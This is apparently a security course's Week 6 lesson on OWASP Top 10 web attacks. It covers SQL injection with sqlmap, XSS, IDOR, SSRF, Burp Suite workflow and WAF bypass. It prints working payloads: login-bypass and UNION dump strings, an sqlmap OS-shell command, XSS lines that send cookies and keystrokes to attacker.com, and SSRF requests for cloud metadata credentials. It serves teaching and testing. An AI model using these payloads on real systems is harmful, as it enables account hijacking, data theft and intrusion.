---
title: "Week 6 — Web Application Attacks (OWASP Top 10)"
description: Deep dive into the OWASP Top 10 web vulnerabilities — SQL injection, XSS, IDOR, CSRF, and Burp Suite methodology.
---

# Week 6 — Web Application Attacks (OWASP Top 10)

<div class="week-meta" markdown>
**Course Objectives:** CO3 &nbsp;|&nbsp; **Focus:** Web Security &nbsp;|&nbsp; **Difficulty:** ⭐⭐⭐☆☆
</div>

---

## Learning Objectives

- [ ] Explain and demonstrate the OWASP Top 10 (2021) vulnerability categories
- [ ] Perform SQL injection attacks (in-band, blind, time-based) using sqlmap
- [ ] Execute Cross-Site Scripting (XSS) attacks (reflected, stored, DOM)
- [ ] Use Burp Suite Proxy, Repeater, and Intruder for web application testing
- [ ] Identify broken access control and IDOR vulnerabilities

---

## 1. OWASP Top 10 (2021)

The **Open Web Application Security Project** publishes the definitive ranking of web application security risks:

| Rank | Category | Key CWEs |
|------|----------|----------|
| **A01** | Broken Access Control | CWE-200, CWE-284 |
| **A02** | Cryptographic Failures | CWE-259, CWE-327 |
| **A03** | Injection (SQLi, XSS, command) | CWE-89, CWE-79 |
| **A04** | Insecure Design | CWE-209, CWE-256 |
| **A05** | Security Misconfiguration | CWE-16, CWE-611 |
| **A06** | Vulnerable & Outdated Components | CWE-1035, CWE-937 |
| **A07** | Identification & Auth Failures | CWE-297, CWE-287 |
| **A08** | Software & Data Integrity Failures | CWE-829, CWE-494 |
| **A09** | Security Logging & Monitoring Failures | CWE-223, CWE-778 |
| **A10** | Server-Side Request Forgery (SSRF) | CWE-918 |

---

## 2. SQL Injection (A03)

SQLi occurs when user-supplied input is incorporated into database queries without proper sanitization.

### 2.1 How SQLi Works

```sql
-- Intended query (login check):
SELECT * FROM users WHERE username='admin' AND password='secret';

-- Attacker input: username = admin'--
-- Resulting query:
SELECT * FROM users WHERE username='admin'--' AND password='whatever';
-- The -- comments out the password check → login bypass
```

### 2.2 SQLi Types

```
IN-BAND SQLi (results returned directly in response)
  ├── Error-Based   → DB error messages leak data
  └── Union-Based   → UNION SELECT extracts additional data

BLIND SQLi (no direct output — infer from behavior)
  ├── Boolean-Based → True/False conditions change response
  └── Time-Based    → SLEEP() delays confirm injection

OUT-OF-BAND SQLi (data via DNS/HTTP callback — rare but severe)
```

### 2.3 Manual SQLi Testing

```sql
-- Step 1: Detect injection point
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--

-- Step 2: Determine number of columns (UNION-based)
' ORDER BY 1--   (no error)
' ORDER BY 2--   (no error)
' ORDER BY 5--   (error! = 4 columns)

-- Step 3: Find displayed columns
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL,NULL--  (test which columns display)

-- Step 4: Extract data
' UNION SELECT table_name,NULL,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL,NULL FROM users--

-- Time-based blind (MySQL):
'; SELECT SLEEP(5)-- (if 5 second delay, injection confirmed)

-- Boolean blind:
' AND SUBSTRING(username,1,1)='a'--  (iterate characters)
```

### 2.4 sqlmap — Automated SQLi

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/item?id=1"

# POST parameter injection
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With authentication cookie
sqlmap -u "http://target.com/profile?id=5" --cookie="session=abc123"

# Extract all databases
sqlmap -u "http://target.com/item?id=1" --dbs

# Extract tables from specific DB
sqlmap -u "http://target.com/item?id=1" -D webdb --tables

# Dump specific table
sqlmap -u "http://target.com/item?id=1" -D webdb -T users --dump

# OS shell (if DB has FILE privileges)
sqlmap -u "http://target.com/item?id=1" --os-shell

# Burp Suite request file
sqlmap -r request.txt --level=5 --risk=3
```

---

## 3. Cross-Site Scripting (XSS — A03)

XSS allows attackers to inject client-side scripts into web pages viewed by other users.

### 3.1 XSS Types

```
REFLECTED XSS
  → Payload in URL parameter → reflected in response
  → Victim must click malicious link
  → Example: https://target.com/search?q=<script>alert(1)</script>

STORED XSS (Persistent)
  → Payload saved in database (comment, profile, message)
  → All users who view the page execute the script
  → Most dangerous — requires no victim interaction beyond normal browsing

DOM-BASED XSS
  → Payload manipulates DOM client-side via JavaScript
  → Server never sees the payload
  → Difficult to detect with server-side WAFs
```

### 3.2 Useful XSS Payloads

```javascript
// Basic detection
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)

// Cookie theft (attacker exfiltrates session token)
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/?'+document.cookie</script>

// Keylogger
<script>document.onkeypress=function(e){new Image().src='http://attacker.com/k?k='+e.key}</script>

// BeEF hook (full browser exploitation framework)
<script src='http://attacker.com:3000/hook.js'></script>

// Filter bypass techniques:
<ScRiPt>alert(1)</ScRiPt>              // Case variation
<img src=x onerror="alert`1`">        // Backtick alternative to ()
<svg onload=alert(1)>                  // SVG element
<body/onload=alert(1)>                 // Event handler
```

---

## 4. Broken Access Control & IDOR (A01)

**Insecure Direct Object Reference (IDOR)** — changing a parameter value accesses another user's data:

```
Legitimate request:
GET /api/invoice?id=1001  → Returns YOUR invoice

IDOR attack (change ID):
GET /api/invoice?id=1002  → Returns ANOTHER USER's invoice
GET /api/invoice?id=1     → Returns ADMIN's invoice
```

**Horizontal vs. Vertical Privilege Escalation:**

| Type | Description | Example |
|------|-------------|---------|
| **Horizontal** | Access resources of same-privilege users | View other customers' orders |
| **Vertical** | Access higher-privilege functions | Regular user accesses admin panel |

---

## 5. Server-Side Request Forgery (A10)

SSRF forces the server to make HTTP requests on the attacker's behalf — often reaching internal services:

```
Normal flow:
  Browser → Web App → External API

SSRF attack:
  Browser → Web App (with malicious URL) → Internal AWS metadata
  
  Payload: url=http://169.254.169.254/latest/meta-data/
  → Retrieves AWS EC2 instance credentials!
  
  Other SSRF targets:
  http://localhost:6379/          → Redis (often no auth)
  http://localhost:27017/         → MongoDB  
  http://internal-elastic:9200/   → Elasticsearch
  file:///etc/passwd              → Local file read
```

---

## 6. Burp Suite Professional Workflow

Burp Suite is the industry-standard web application testing platform:

### 6.1 Proxy Setup

```
Browser → Configure HTTP proxy: 127.0.0.1:8080 → Burp Proxy → Target

# Import Burp CA certificate to browser (avoids HTTPS cert errors)
# Burp → Proxy → Options → CA Certificate → Export
```

### 6.2 Key Burp Tools

```
PROXY INTERCEPT
  → Capture and modify all requests/responses in real-time
  → Forward, drop, or send to other tools

REPEATER
  → Manually resend modified requests
  → Essential for manual SQLi, XSS, IDOR testing
  → Keyboard shortcut: Ctrl+R (send to Repeater)

INTRUDER (Fuzzing/Brute Force)
  → Mark injection points with § markers §
  → Attack types:
    Sniper    → One payload list, one position at a time
    Battering Ram → Same payload in all positions
    Pitchfork → Multiple lists, parallel positions
    Cluster Bomb → Cartesian product of all payload lists
  → Use for: password brute force, parameter fuzzing, IDOR enumeration

SCANNER (Pro only)
  → Automated vulnerability discovery
  → Active scan sends crafted requests to detect SQLi, XSS, etc.

DECODER
  → Encode/decode: URL, Base64, HTML, Hex, Gzip
  → Essential for analyzing encoded payloads

COMPARER
  → Diff two requests/responses
  → Useful for detecting subtle boolean-based SQLi differences
```

### 6.3 Burp Extensions (BApp Store)

```
Recommended extensions:
  Autorize          → Automated IDOR/access control testing
  JWT Editor        → JWT token manipulation/attack
  SQLiPy            → Integrate sqlmap into Burp
  Param Miner       → Discover hidden parameters
  Active Scan++     → Extended vulnerability checks
  Turbo Intruder    → High-speed fuzzing (Python-based)
```

---

## 7. Web Application Firewall (WAF) Bypass

WAFs filter malicious requests — bypass techniques:

```sql
-- Case variation
SeLeCt UsErNaMe FrOm UsErS

-- Comment insertion
SE/**/LECT user/**/name FROM users

-- URL encoding
%53%45%4C%45%43%54 (SELECT)

-- Double encoding (if server double-decodes)
%2553%2545%254C%2545%2543%2554

-- Alternative syntax (MySQL)
SELECT 0x61646d696e (hex for 'admin')
SELECT CHAR(65,68,77,73,78) ('ADMIN')
```

---

## Key Vocabulary

| Term | Definition |
|------|------------|
| **SQLi** | SQL Injection — unsanitized input in database queries |
| **XSS** | Cross-Site Scripting — injecting scripts into web pages |
| **CSRF** | Cross-Site Request Forgery — tricking authenticated users into actions |
| **IDOR** | Insecure Direct Object Reference — accessing unauthorized objects by ID |
| **SSRF** | Server-Side Request Forgery — server makes requests on attacker's behalf |
| **WAF** | Web Application Firewall — filters malicious HTTP traffic |
| **Burp Suite** | Web application security testing proxy framework |
| **Blind SQLi** | Injection where results aren't shown directly in response |

---

## Review Questions

!!! question "Self-Assessment"
    1. Explain the difference between stored and reflected XSS. Which poses a greater risk, and why?
    2. Walk through exploiting a login form vulnerable to SQL injection. Show both the manual technique and how sqlmap would automate this.
    3. A web app fetches URLs provided by users to generate previews. How would you test for SSRF, and what internal resources would you target?
    4. You find an IDOR in `/api/user?id=105` — describe your methodology to determine the full impact of this vulnerability.
    5. How does a Content Security Policy (CSP) mitigate XSS, and what are its limitations?

---

## Further Reading

- 📄 [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- 📄 [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free interactive labs
- 📖 *The Web Application Hacker's Handbook, 2nd Ed.* — Chapters 7–10
- 📄 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — comprehensive payload lists
- 📄 [HackTricks Web](https://book.hacktricks.xyz/pentesting-web/) — practical techniques reference

---

*[← Week 5](week05.md) &nbsp;|&nbsp; [Course Index](index.md) &nbsp;|&nbsp; [Week 7 →](week07.md)*
